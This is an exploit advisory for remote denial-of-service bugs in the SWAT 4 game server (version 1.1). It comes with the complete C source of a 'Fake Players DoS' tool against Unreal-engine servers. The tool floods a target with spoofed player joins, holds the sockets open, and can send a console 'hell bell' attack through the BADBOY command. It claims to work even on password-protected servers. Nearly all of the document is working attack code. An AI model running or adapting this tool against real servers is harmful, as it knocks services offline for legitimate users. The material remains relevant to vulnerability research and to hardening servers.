source: http://www.securityfocus.com/bid/30299/info

SWAT 4 is prone to multiple remote denial-of-service vulnerabilities because the application fails to properly handle certain input.

An attacker may exploit these issues to crash the affected application, denying service to legitimate users.

SWAT 4 1.1 is vulnerable; other versions may also be affected. 

/*
    Copyright 2008 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1.1"
#define PORT        7777
#define BUFFSZ      4096     // the max supported is 576
#define HELLBELL    "BADBOY " \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a"

#define UT2_QUERY   "\x79\x00\x00\x00\x00"  // not used
#define GS1_QUERY   "\\info\\"              // \status\ returns 3 packets, I'm too lazy to handle all of them
#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00"                    "\xff\x00\x00" "\x00"
#define GS3_QUERY   "\xfe\xfd\x09" "\x00\x00\x00\x00"
#define GS3_QUERYX  "\xfe\xfd\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" "\xff\x00\x00" "\x00"



void fake_players_socket(int sd) {  // simple to add function for not closing sockets
    #define MAXFAKESOCKS    64
    static int  socks[MAXFAKESOCKS],
                socksp,
                init    = 1;
    int         i;

    if(init || (sd < 0)) {
        for(i = 0; i < MAXFAKESOCKS; i++) socks[i] = -1;
        socksp = 0;
        init   = 0;
        return;
    }
    if(socksp >= MAXFAKESOCKS) socksp = 0;
    if(socks[socksp] >= 0) close(socks[socksp]);
    socks[socksp] = sd;
    socksp++;
}
void activate_fix(int *fix);
int unreal_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int *chall, u8 **errmsg);
u8 *rndhash(int size);
int unreal_info(u8 *buff, struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
void fgetz(u8 *data, int len);
int calc_authresp(int num);
int write_unrnum(int num, u8 *buff, int bits);
int read_unrnum(int *num, u8 *buff, int bits);
int write_unrser(int num, u8 *buff, int bits, int max);
u8 *unreal_parse_pck(u8 *buff, int size, int *chall);
int unreal_build_pck(u8 *buff, int pck, ...);
int read_unreal_index(u8 *index_num, int *ret);
int write_unreal_index(int number, u8 *index_num);
int read_bitmem(u8 *in, int inlen, u8 *out, int bits);
int write_bitmem(u8 *in, int inlen, u8 *out, int bits);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int     aafix           = 0,    // America's Army uses 0x800 instead of 0x3ff
        u3fix           = 0,    // Unreal 3 no longer uses index numbers
        rvfix           = 0,    // RavenShiel uses 0x50f instead of 0x3ff (this is useless since it's enough compatible with AA)
        pariahfix       = 0,    // Pariah
        movfix          = 0,    // Men of Valor
        //khgfix          = 0,    // Klingon Honor Guard uses readbits 16 1 9 16 3 and 12 instead of index numbers
        // unreal1fix, similar to above... not needed to support at the moment
        verbose         = 0,
        challenge_fix   = 0,
        hex_challenge   = 0,
        force_team      = 0,
        force_fix       = 0,
        send_verbose    = 0,
        fast_connect    = 1,
        first_time      = 1;
u8      *gamestatefix[] = {
        "",     // none
            // the order of the hash of GAMESTATE checked in memory is 77778888555566661111222233334444
            //the second part of the GAMESTATE hash is the MD5 of "SCR3W3DD@P00CH" and the MD5 of the file (for example SwatGame.u)
            // Swat4 requires 32 successful GAMESTATEs, it's enough to send the same one 32 times,
            // but at the moment my tool doesn't support the sending of more packets
        "GAMESTATE FA1F998D4D4C2E5F492B79FF1D58488E5e2b7c57161e65909c8c7b01923aa4c4",   // UT2XMP demo
        "GAMESTATE 520996A03FACE2BE4FF9A24F17158B3B7c07dc2b72044ef0e6278707e9e8b0f6",   // UT2003
        // "GAMESTATE D2ECC882E8945E68413DDF3DCB7A1BBEfe95745de189869e61331593a64f33de",   // SWAT4 
        NULL
        };



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    int     i,
            sd,
            len,
            pck,
            ver,
            chall,
            onlyone         = 0,
            infoquery       = 1,
            sendauth        = 0,
            gamestatefixes  = 0,
            random_username = 0,
            force_closesock = 0;
    u16     port            = PORT;
    u8      buff[BUFFSZ],
            hello[BUFFSZ]   = "",
            auth[BUFFSZ]    = "",
            login[BUFFSZ]   = "",
            hellover[64]    = "",
            pass[64]        = "",
            tmpchall[12],
            *cmd_only       = NULL,
            *cmd_plus       = "",
            *login_plus     = "",
            *errmsg,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Unreal engine basic client and Fake Players DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s [options] <host> <port>\n"
            "\n"
            "Options:\n"
            "-c \"C\"  send only the custom command C\n"
            "-C \"C\"  send the custom command C plus the others needed to join\n"
            "-l \"S\"  add a custom URL string S to the LOGIN command, for example:\n"
            "        -l \"Index.ut2?Name=player?Class=EnginePawn?Character=Jakob?team=1\"\n"
            "        -l \"?Name=player?UserName=UserName?MAC=\"\n"
            //"        -l \"Entry.aao?Name=Recruit?Class=AGP_Characters.AGP_Character?team=255?UserName=UserName?MAC=\"\n"
            "-f      use the full method (HELLO + LOGIN and so on), needed with some games\n"
            "        of the Unreal 1 engine to avoid the crash of the server\n"
            //"-u      send a LOGIN command with a random UserName field (for America's Army)\n" AUTOMATIC!!!
            //"-a      send the AUTH command\n" AUTOMATIC!!!
            "-i      do not query the server for informations and for hostport\n"
            "-b      Windows dedicated server hell bell attack through the BADBOY command\n"
            "-v      verbose mode, show all the commands received from the server\n"
            "-V      show all the commands sent by this tool\n"
            "-1      only one fake player, debug\n"
            "-x N    force the activation of a specific compatibility fix, where N is for:\n"
            "        1 = America's Army     2 = Unreal 3 engine    3 = Raven Shield\n"
            "        4 = Pariah             5 = Men of Valor\n"
            "\n"
            "works also with servers protected by password without knowing the keyword!\n"
            "should work with almost any game based on the Unreal engine (1, 2 and 3)\n"
            "\n", argv[0]);
        exit(1);
    }

    argc -= 2;
    for(i = 1; i < argc; i++) {
        if(((argv[i][0] != '-') && (argv[i][0] != '/')) || (strlen(argv[i]) != 2)) {
            printf("\nError: wrong argument (%s)\n", argv[i]);
            exit(1);
        }
        switch(argv[i][1]) {
            case 'v': {
                verbose         = 1;
                break;
            }
            case 'V': {
                send_verbose    = 1;
                break;
            }
            case 'f': {
                fast_connect    = 0;
                break;
            }
            case 'c': {
                cmd_only        = argv[++i];
                break;
            }
            case 'C': {
                cmd_plus        = argv[++i];
                break;
            }
            case 'l': {
                login_plus      = argv[++i];
                fast_connect    = 0;
                break;
            }
            case '1': {
                onlyone         = 1;
                break;
            }
            case 'i': {
                infoquery       = 0;
                break;
            }
            case 'a': {
                sendauth        = 1;
                break;
            }
            case 'b': {
                cmd_only        = HELLBELL;
                force_closesock = 1;
                break;
            }
            case 'u': {
                random_username = 1;
                fast_connect    = 0;
                break;
            }
            case 'x': {
                force_fix       = atoi(argv[++i]);
                break;
            }
            default: {
                printf("\nError: wrong argument (%s)\n", argv[i]);
                exit(1);
            }
        }
    }

    host = argv[argc];
    port = atoi(argv[argc + 1]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    if(infoquery && (ntohs(peer.sin_port) != 7777)) {
        ver = unreal_info(buff, &peer);
        if(ver) sprintf(hellover, "MINVER=%d VER=%d", ver, ver);
    }

        /* full list of parameters and values parsed by various games which use the Unreal engine
        USERFLAG (number)
        HELLO
            MINVER=
            VER=
        AUTH
            HASH=
            RESPONSE=
            USERNAME=
            PASSWORD=
            GM=
        NETSPEED (number >= 1800)
        HAVE
            GUID=
            GEN=
        SKIP
            GUID=
        LOGIN
            RESPONSE=
            URL=
        JOIN
        BADBOY (followed by the string visualized in the console)
        PETE
            PKT=
            PKG=
        REPEAT
        OPENVOICE (number)
            // UT2003
        CRITOBJCNT (number, similar to PETE)
        GAMESTATE (ID)
            NAME=
            // SWAT4
        GAMESPYRESPONSE
            RS=
        GAMESPYSTATRESPONSE
            PID=
            RS=
        VERIFYCONTENT
            FILE=
            MD5=
        GAMECONFIGCOUNT (number)
        GAMECONFIG
            CONFIGFILE=
            CONFIGMD5=
            // Warpath and Pariah
        JOINSPLIT
            GAMEPAD=
            GUESTNUM=
        DISABLESPLIT
            GAMEPAD=
        EPIC (hash)
            // Raven Shield
        SERVERPING
        ARMPATCH
            // UT3
        DEBUG
        ABORT
            GUID=
        JOINSPLIT
        */
        // generic in-game commands: open namecount start map servertravel say disconnect

    printf("\n- start attack:\n");

    if(force_fix) {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        errmsg = unreal_parse_pck("\0\0", 0, NULL);
        goto handle_error_message;
    }

    for(;;) {
        pck = 0;
        printf("\n  Player: ");

        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        do {
            peerl.sin_port++;
        } while(bind(sd, (struct sockaddr *)&peerl, sizeof(struct sockaddr_in)) < 0);

        if(!fast_connect || u3fix || movfix) {    // Unreal 3 requires the LOGIN packet, while MOV crashes!
            sprintf(hello, "HELLO %sREVISION=0 %s", u3fix ? "P=1 " : "", hellover);

            len = unreal_build_pck(buff, pck++,
                hello,
                NULL);

            len = unreal_send_recv(sd, buff, len, buff, BUFFSZ, &peer, &chall, &errmsg);
            if(len < 0) goto handle_error_message;

            //sprintf(login, "LOGIN RESPONSE=%i URL=Index.ut2?Name=player?Class=EnginePawn?Character=Jakob?team=1%s%s", chall, pass[0] ? "?password=" : "", pass);
            sprintf(tmpchall, hex_challenge ? "%08X" : "%i", chall);    // I don't know if this is right, seems that U3 doesn't check the challenge!
            sprintf(login, "LOGIN RESPONSE=%s URL=%s%s%s%s", tmpchall, login_plus, force_team ? "?Team=1" : "", pass[0] ? "?password=" : "", pass);
            if(random_username) sprintf(login + strlen(login), "?UserName=%s", rndhash(5));
        }

        if(sendauth) {
            sprintf(auth,  "AUTH HASH=%s GM=%s USERNAME=%s PASSWORD=%s", rndhash(16), rndhash(66), rndhash(4), rndhash(16));
        }

        if(cmd_only) {
            len = unreal_build_pck(buff, pck++,
                cmd_only,
                NULL);
        } else {
            len = unreal_build_pck(buff, pck++,
                auth,   // causes only problems!
                login,
                //"NETSPEED 1800",    // useless
                "PETE PKT=1 PKG=1",
                "REPEAT",
                "CRITOBJCNT 1",
                gamestatefix[gamestatefixes],
                cmd_plus,
                "JOIN",
                NULL);
        }
        if(len > BUFFSZ) {
            printf("\nError: your packet is too big\n");
            exit(1);
        }
        len = unreal_send_recv(sd, buff, len, buff, BUFFSZ, &peer, NULL, &errmsg);
        if(len < 0) goto handle_error_message;

        if(onlyone) {
            if(verbose) {
                for(;;) {   // show any other incoming message
                    len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 0);
                    if(len < 60) break;  // break if too small
                    errmsg = unreal_parse_pck(buff, len, NULL);
                    if(errmsg) break;
                }
            }
            printf("\n- done\n");
            exit(1);
        }

        if(force_closesock) {
            close(sd);
        } else {
            fake_players_socket(sd);
        }
        continue;

handle_error_message:
        close(sd);
        if(!errmsg) continue;
        if(strstr(errmsg, "UPGRADE")) {
            p = strstr(errmsg, "MINVER");   // UPGRADE MINVER= VER=
            if(!p) exit(1);
            strncpy(hellover, p, sizeof(hellover));
            hellover[sizeof(hellover) - 1] = 0;
        } else if(strstr(errmsg, "SERVERFULL") || stristr(errmsg, "capacity") || stristr(errmsg, "MaxedOutMessage") || stristr(errmsg, "players")) {
            printf(" server full ");
            for(i = 3; i; i--) {
                printf("%d\b", i);
                sleep(ONESEC);
            }
        } else if(strstr(errmsg, "NEEDPW") || strstr(errmsg, "WRONGPW") || stristr(errmsg, "password") || stristr(errmsg, "PassWd")) {
            printf("\n- server is protected with password, insert the keyword: ");
            fgetz(pass, sizeof(pass));
        } else if(strstr(errmsg, "BRAWL")) {
            gamestatefixes++;
            if(!gamestatefix[gamestatefixes]) {
                printf("\nError: this game needs one or more GAMESTATE commands not implemented\n");
                exit(1);
            }
            printf("\n- %s", gamestatefix[gamestatefixes]);
        } else if(stristr(errmsg, "Username")) {
            if(random_username) exit(1);
            printf("\n- activate random UserName in the LOGIN command");
            random_username = 1;
            fast_connect    = 0;
        } else if(stristr(errmsg, "Could not find team")) {
            if(force_team) exit(1);
            printf("\n- activate team fix");
            force_team      = 1;
            fast_connect    = 0;
        } else if(stristr(errmsg, "stats")) {
            if(sendauth) exit(1);
            sendauth        = 1;
        } else if(stristr(errmsg, "CHALLENGE")) {
            challenge_fix++;
            if(challenge_fix == 1) {
                printf("\n- activate the Frontline Fuel of War challenge fix");
            } else if(!hex_challenge) {
                printf("\n- activate the hexadecimal challenge fix");
                challenge_fix = 0;
                hex_challenge = 1;
            } else {
                printf("\n"
                "Error: seems that this game requires a specific challenge-response algorithm\n"
                "\n");
                exit(1);
            }
        } else if(!strcmp(errmsg, "NOFIX")) {
            printf("\n- activate full connect without compatibility fixes");
            activate_fix(NULL);
        } else if(!strcmp(errmsg, "AAFIX")) {
            printf("\n- activate the America's Army compatibility");
            activate_fix(&aafix);
        } else if(!strcmp(errmsg, "U3FIX")) {
            printf("\n- activate the Unreal 3 engine compatibility");
            activate_fix(&u3fix);
        } else if(!strcmp(errmsg, "RVFIX")) {
            printf("\n- activate the Raven Shield compatibility");
            activate_fix(&rvfix);
        } else if(!strcmp(errmsg, "PARIAHFIX")) {
            printf("\n- activate the Pariah/Warpath compatibility");
            activate_fix(&pariahfix);
        } else if(!strcmp(errmsg, "MOVFIX")) {
            printf("\n- activate the Men of Valor compatibility");
            activate_fix(&movfix);
        } else {
            printf("\nError: %s\n", errmsg);
            exit(1);
        }
    }
    return(0);
}



void activate_fix(int *fix) {
    aafix       = 0;
    u3fix       = 0;
    rvfix       = 0;
    pariahfix   = 0;
    movfix      = 0;
    if(fix) *fix = 1;
}



int unreal_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int *chall, u8 **errmsg) {
    int     len;

    len = send_recv(sd, in, insz, out, outsz, peer, first_time);
    if(len < 0) {
        if(len == -1) std_err();
        printf(" players_per_IP limit or timed out ");
        sleep(ONESEC);
        *errmsg = NULL;
        return(-1);
    }
    if(first_time) first_time = 0;

#ifdef DUMPPCK
    static  int num = 0;
    FILE    *fd;
    char    fname[64];
    sprintf(fname, "unrealfp_pck.%03d", num++);
    fd = fopen(fname, "wb");
    if(!fd) std_err();
    fwrite(out, 1, len, fd);
    fclose(fd);
#endif

    *errmsg = unreal_parse_pck(out, len, chall);
    if(*errmsg) return(-1);
    return(len);
}



u8 *rndhash(int size) {
    static u32  rnd = 0;
    static int  sel = 0;
    static u8   out[4][256];
    static const u8 hex[16] = "0123456789abcdef";
    int         i;
    u8          *ret,
                *p;

    if(!rnd) rnd = ~time(NULL);

    ret = out[sel++ & 3];
    p = ret;
    for(i = 0; i < size; i++) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        *p++ = hex[(rnd & 0xff) >> 4];
        *p++ = hex[(rnd & 0xff) & 15];
    }
    *p = 0;
    return(ret);
}



int unreal_info(u8 *buff, struct sockaddr_in *peer) {
    u32     chall;
    int     sd,
            len,
            type,
            retver      = 0;
    u8      gs3[32],
            *gamever    = NULL,
            *hostport   = NULL;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("\n- send info queries\n");
          send_recv(sd, GS1_QUERY, sizeof(GS1_QUERY) - 1, NULL, 0,      peer, 0);
          send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, NULL, 0,      peer, 0);
          send_recv(sd, GS3_QUERY, sizeof(GS3_QUERY) - 1, NULL, 0,      peer, 0);
    len = send_recv(sd, NULL,      0,                     buff, BUFFSZ, peer, 0);
    if(len < 0) goto quit;
    if(buff[0] == '\\') {
        type = 1;
    } else {
        if(len < 8) {
            type = 2;
            len = send_recv(sd, NULL,  0,                    buff, BUFFSZ, peer, 0);
            if(len < 0) goto quit;
        } else {
            type = 3;
            memcpy(gs3, GS3_QUERYX, sizeof(GS3_QUERYX) - 1);
            chall = atoi(buff + 5);
            gs3[7]  = chall >> 24;
            gs3[8]  = chall >> 16;
            gs3[9]  = chall >>  8;
            gs3[10] = chall;
            len = send_recv(sd, gs3, sizeof(GS3_QUERYX) - 1, buff, BUFFSZ, peer, 0);
            if(len < 0) goto quit;
        }
    }

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len,
        (type == 1) ? 1 : 0, (type == 1) ? '\\' : '\0', (type == 1) ? 0 : 5, 0,
        "gamever",  &gamever,
        "hostport", &hostport,
        NULL,       NULL);

    if(gamever) {
        retver = atoi(gamever);
    }
    if(hostport) {
        peer->sin_port = htons(atoi(hostport));
        printf("\n- set hostport %hu\n", ntohs(peer->sin_port));
    }

quit:
    close(sd);
    return(retver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



void fgetz(u8 *data, int len) {
    u8      *p;

    fgets(data, len, stdin);
    for(p = data; *p && (*p != '\n') && (*p != '\r'); p++);
    *p = 0;
}



int calc_authresp(int num) {
    if(challenge_fix == 1) return((num * 178) ^ (num >> 16) ^ (num << 16) ^ 0xfe11ae23);    // FFOW
    return((num * 237) ^ (num >> 16) ^ (num << 16) ^ 0x93fe92ce);
}



int write_unrnum(int num, u8 *buff, int bits) {
    int     len;
    u8      mini[5];

    len = write_unreal_index(num, mini);
    return(write_bitmem(mini, len, buff, bits));
}



int read_unrnum(int *num, u8 *buff, int bits) {
    u8      mini[5];

    *num = 0;
    read_bitmem(buff, 5, mini, bits);
    return(bits + (read_unreal_index(mini, num) << 3));
}



int write_unrser(int num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    for(b = 1; b && (b < max); b <<= 1) {
        bits = write_bits((num & b) ? 1 : 0, 1, buff, bits);
    }
    return(bits);
}



int read_unrser(int *num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    *num = 0;
    for(b = 1; b && (b < max); b <<= 1) {
        if(read_bits(1, buff, bits)) *num += b;
        bits++;
    }
    return(bits);
}



u8 *unreal_parse_pck(u8 *buff, int size, int *chall) {
    static int  retfix  = 0,
                done    = 0;
    static u8   str[BUFFSZ];
    int     b,
            len,
            pck;
    u8      *p;

    if(force_fix) {
        retfix = force_fix - 1; // because then it does retfix++
        force_fix = 0;
    }
    if(chall) *chall = 0;

    read_unrser(&pck, buff, 0, 0x4000);
    if(u3fix) {
        switch(pck) {
            case 0:  b = 52;    break;
            case 1:  b = 67;    break;
            default: b = 52;    break;  // doesn't work with all the packets
        }
    } else if(pariahfix) {
        switch(pck) {
            case 0:  b = 66;    break;
            case 1:  b = 81;    break;
            default: b = 52;    break;  // doesn't work with all the packets
        }
    } else {
        switch(pck) {
            case 0:  b = 67;    break;
            case 1:  b = 82;    break;
            default: b = 52;    break;  // doesn't work with all the packets
        }
    }
    if(aafix)  b++;
    if(rvfix)  b++;
    if(movfix) b++;
    size <<= 3;

    /* correct but not necessary, probably in a future implementation
    b -= 12;
    b = read_unrser(&len, buff, b, 0x1000);
    if((b + len) < size) size = b + len;
    */

    while(b < size) {
        b = read_unrnum(&len, buff, b);
        if((len < 0) || ((b + (len << 3)) > size) || (len > (sizeof(str) - 1))) break; 
        if(!done) done++;
        b = read_bitmem(buff, len, str, b);
        str[len] = 0;
        if(verbose) printf("\n  %s", str);
        if(chall) {
            p = strstr(str, "CHALLENGE=");
            if(p) {
                sscanf(p + 10, hex_challenge ? "%08X" : "%i", chall);
                *chall = calc_authresp(*chall);
            }
        }
        if(strstr(str, "FAIL") || strstr(str, "BRAWL") || strstr(str, "UPGRADE")) {
            return(str);
        }
    }
    if(!done) {
        retfix++;
        if(retfix == 1) return("AAFIX");
        if(retfix == 2) return("U3FIX");
        if(retfix == 3) return("RVFIX");
        if(retfix == 4) return("PARIAHFIX");
        if(retfix == 5) return("MOVFIX");
        if(fast_connect) {
            retfix       = 0;
            fast_connect = 0;
            return("NOFIX");
        }
        printf("\n"
            "Error: seems that this game requires a specific compatibility fix\n"
            "       try to relaunch this tool another time\n"
            "\n");
        exit(1);
    }
    return(NULL);
}



int unreal_build_pck(u8 *buff, int pck, ...) {
    va_list ap;
    int     i,
            b,
            sl,
            len,
            bsize,
            val3ff,
            val8,
            val1000;
    u8      *s;

    //devastation is not supported, it uses 0x4000 1 1 0x4000 1 1 1 1 0x3ff 0x1000 

    val8 = 0x08;
    if(pariahfix) val8 = 0x4;

    val3ff = 0x3ff;
    if(aafix) val3ff = 0x800;
    if(rvfix) val3ff = 0x50f;   // takes the same number of bits of AA... it's useless

    val1000 = 0x1000;
    if(movfix) val1000 = 0x1e00;

    b = 0;
    b = write_unrser(pck, buff, b, 0x4000);
    if(pck == 0) {
        b = write_bits(0, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_unrser(0, buff, b, val3ff);
    } else if(pck == 1) {
        b = write_bits(1, 1, buff, b);
        b = write_unrser(0, buff, b, 0x4000);
        b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_unrser(0, buff, b, val3ff);
    } else {   // this one is not supported
        b = write_bits(1, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_unrser(0, buff, b, val3ff);
    }
    b = write_unrser(pck + 1, buff, b, 0x400);
    b = write_unrser(1, buff, b, val8); // 0 with pck > 1
    bsize = b;

    for(i = 0; i < 2; i++) {  // used only for calculating the packet size! it allows to save an additional buffer
        va_start(ap, pck);
        while((s = va_arg(ap, u8 *))) {
            sl = strlen(s) + 1;
            if(sl == 1) continue;               // skip empty
            if(!i && send_verbose) printf("\n^ %s", s);
            b = write_unrnum(sl, buff, b);
            b = write_bitmem(s, sl, buff, b);   // in reality they are index numbers
        }
        va_end(ap);

        if(!i) b = write_unrser(b - bsize, buff, bsize, val1000);
    }

    b = write_bits(1, 1, buff, b);   // ???

    len = b >> 3;
    if(b & 7) len++;
    if(send_verbose) printf("\n");
    return(len);
}



int read_unreal_index(u8 *index_num, int *ret) {
    int     len,
            result;
    u8      b0 = index_num[0],
            b1 = index_num[1],
            b2 = index_num[2],
            b3 = index_num[3],
            b4 = index_num[4];

    if(u3fix) {
        *ret = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
        return(4);
    }

    result = 0;
    len    = 1;
    if(b0 & 0x40) {
        len++;
        if(b1 & 0x80) {
            len++;
            if(b2 & 0x80) {
                len++;
                if(b3 & 0x80) {
                    len++;
                    result = b4;
                }
                result = (result << 7) | (b3 & 0x7f);
            }
            result = (result << 7) | (b2 & 0x7f);
        }
        result = (result << 7) | (b1 & 0x7f);
    }
    result = (result << 6) | (b0 & 0x3f);
    if(b0 & 0x80) result = -result;
    *ret = result;
    return(len);
}



int write_unreal_index(int number, u8 *index_num) {
    int     len,
            sign = 1;

    if(u3fix) {
        index_num[0] = number & 0xff;
        index_num[1] = (number >> 8) & 0xff;
        index_num[2] = (number >> 16) & 0xff;
        index_num[3] = (number >> 24) & 0xff;
        return(4);
    }

    if(number < 0) {
        number = -number;
        sign = -1;
    }

    len = 1;
    index_num[0] = (number & 0x3f);
    if(number >>= 6) {
        index_num[0] += 0x40;
        index_num[1] = (number & 0x7f);
        len++;
        if(number >>= 7) {
            index_num[1] += 0x80;
            index_num[2] = (number & 0x7f);
            len++;
            if(number >>= 7) {
                index_num[2] += 0x80;
                index_num[3] = (number & 0x7f);
                len++;
                if(number >>= 7) {
                    index_num[3] += 0x80;
                    index_num[4] = number;
                    len++;
                }
            }
        }
    }
    if(sign < 0) index_num[0] += 0x80;
    return(len);
}



int read_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; out++) {
        *out = read_bits(8, in, bits);
        bits += 8;
    }
    return(bits);
}



int write_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; in++) {
        bits = write_bits(*in, 8, out, bits);
    }
    return(bits);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-2);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif